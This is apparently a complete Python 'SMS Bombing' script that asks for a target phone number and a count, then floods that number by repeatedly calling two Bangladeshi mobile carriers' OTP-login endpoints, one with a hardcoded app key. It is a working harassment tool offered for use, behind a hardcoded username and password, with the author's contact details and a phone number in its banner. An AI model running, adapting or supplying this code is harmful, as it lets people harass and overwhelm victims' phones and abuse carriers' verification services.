import os
import requests
import time
from requests.structures import CaseInsensitiveDict

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
purple="\033[0;35m"
os.system('clear')
line=yellow+"===================="+purple+"===================="+red+"===================="+purple+"===================="+yellow+"===================="+yellow+"===================="+purple+"===================="+red+"===================="+purple+"===================="+yellow+"===================="
space=" "
logo=yellow+str("""
   ╔══════════════════════════════════════════════╗
   ║                                              ║
   ║  Author : TaNviR-AhMeD-RiYaD                 ║
   ║                                              ║
   ║  Facebook : @MrTaNviiR                       ║
   ║                                              ║
   ║  Imo : +8801632964785                        ║
   ║                                              ║
   ╚══════════════════════════════════════════════╝ 
 
              

""")

      
 #HEADER                
text=lightblue+"\t\tCreated By : "+yellow+"TaNviiR RiiYaD"+cyan+"\n\n\t\t★★ "+purple+"Don't Try to Know Me"+cyan+" ★★   \n" 
notice=""     
def header():
	print(logo)
	print(text)
	print(line)
	print(notice)

#SECURITY
header()
n=2
while n==2:
		a=str(input(cyan+"\n\n\t\t[>] Username : "+yellow))
		b=str(input(cyan+"\n\n\t\t[>] Password : "+yellow))
		if a=="TaNviR"  and b=="RiYaD":
			print(green+"\n\n\t\t[ √ ] Correct")
			n=3
		else:
			
			print(red+"\n\n\t\t[ × ] Wrong Try Again")
			n=2
			
			os.system('clear')
			header()
#SELECT_MAIN
def opt():
	print(green+"\n==> Select Your Option From Below")
	print(yellow+"\n\n [1] SMS Bombing")
	

#MAIN_TOOL
os.system('clear')
tt=1
header()	
opt()
while tt<2:
	opt2=str(input(blue+"\n\n [>] Enter the number of option : "+yellow))
	if opt2=="1":
		text=cyan+"\t\tCreated By : TaNviiR RiiYaD"+green+"\n\n\t\t★★ Don't Try to Know me ★★   \n" 
		os.system('clear')
		header()
		number=str(input(lightblue+"\n\n\t [>] Enter Your Target Number : "+green))
		ammount=int(input(lightblue+"\n\t [>] Enter The Ammount : "+green))
		os.system('clear')
		notice=green+"\n\t\t\t   [•] Tools is running......\n\n"
		header()
		ammount2=1
		totalsent=0
		totalnotsent=0
		while ammount2<ammount+1:
			try:
				if "yy" in number or "yyy" in number:
					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
						
				else:
					url=url = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13002&app_version=78&msisdn=88"+number
					headers=CaseInsensitiveDict()
					headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
					r=requests.get(url, headers=headers)
					
						
						
				if ammount2==1:
					print(purple+"\n ★★Successfully★★==>   "+green+"[✓] 1st SMS Sent.")
				elif ammount2==2:
					print(purple+"\n ★★Successfully★★==>   "+green+"[✓] 2nd SMS Sent.")
				elif ammount2==3:
					print(purple+"\n ★★Successfully★★==>   "+green+"[✓] 3rd SMS Sent.")
				else:
					print(purple+"\n ★★Successfully★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
				time.sleep(0.01)
				totalsent+=1
				ammount2+=1
			except:
				if ammount2==1:
					print(cyan+"\n ★★Failed★★==>   "+red+"[×] 1st SMS Not Sent.")
				elif ammount2==2:
					print(cyan+"\n ★★Failed★★==>   "+red+"[×] 2nd SMS Not Sent.")
				elif ammount2==3:
					print(cyan+"\n ★★Failed★★==>   "+red+"[×] 3rd SMS Not Sent.")
				else:
					print(cyan+"\n ★★Failed★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
					time.sleep(0.01)
					ammount2+=1
									
								
		totalhit=ammount2-1
		totalnotsent=totalhit-totalsent
		print(purple+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
		lastt=str(input(purple+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue:\n"))
		os.system('clear')
		notice=""
		text=green+"\n\n\t\t★★★Fucker TooLs★★★   \n" 
		header()
		opt()